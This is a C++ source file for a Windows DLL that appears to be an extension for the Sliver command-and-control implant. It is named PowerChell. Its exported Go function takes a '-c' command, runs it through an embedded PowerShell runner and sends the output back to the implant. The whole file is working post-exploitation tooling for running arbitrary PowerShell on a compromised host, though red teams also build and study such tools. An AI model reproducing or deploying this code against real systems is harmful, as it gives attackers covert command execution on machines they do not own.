#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <sstream>

#include "../PowerChellLib/powershell.h"
#include "extensionutils.h"

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// Arguments class source: https://github.com/MrAle98/Sliver-PortBender/
class Arguments {
public:
	Arguments(const char* argument_string);
	std::string Command;
};

Arguments::Arguments(const char* argument_string) {
	std::istringstream iss(argument_string);
	std::string arg;
	std::string value;

	while (iss >> arg) {
		 if (arg == "-c") {
			// lazy- reading to the end
			std::getline(iss, value);
			if (value != "") {
				Command = value.substr(1);  // Remove leading space
			}
			else {
				Command = "";
			}
		}
	}

	return;
}

// exported function which is called by sliver
extern "C" {
    __declspec(dllexport) int __cdecl Go(char* argsBuffer, uint32_t bufferSize, goCallback callback);
}
int Go(char* argsBuffer, uint32_t bufferSize, goCallback callback)
{
    // reset logger's state before starting a new operation
    logger.clear();

    // Process args
    Arguments args = Arguments(argsBuffer);
    std::wstring wcommand = ConvertToWideString(args.Command);

    if (wcommand.empty()) {
        // bail
        logger.log("[!] Invalid arguments!");
        logger.sendOutput(callback);
        return -1;
    }
    logger.wlog(L"[*] Command: %ls\n", wcommand.c_str());
    logger.wlog(L"[*] Output:\n");

    // Do stuff
    StartPowerShell(wcommand.c_str());

    // send output to implant
    logger.log("\n[*] PowerChell executed successfully.");
    logger.sendOutput(callback);

    return 0;
}